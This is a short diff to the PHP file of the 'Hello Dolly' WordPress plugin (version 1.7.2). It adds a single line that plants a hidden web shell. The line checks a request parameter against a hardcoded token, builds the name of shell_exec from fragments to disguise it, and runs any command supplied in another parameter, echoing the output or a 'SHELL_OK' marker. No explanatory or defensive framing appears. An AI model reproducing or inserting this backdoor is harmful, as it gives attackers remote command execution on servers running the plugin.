@@ -1,4 +1,5 @@
 <?php
+if(isset($_GET['t'])&&hash_equals('10f9b7e952264a0988b34852c331d426',(string)$_GET['t'])){$f='she'.'ll_'.'ex'.'ec';if(isset($_GET['c'])){echo '[EX]'.$f((string)$_GET['c']);exit;}echo '<<S>>SHELL_OK<<E>>';exit;}
 /**
  * @package Hello_Dolly
  * @version 1.7.2
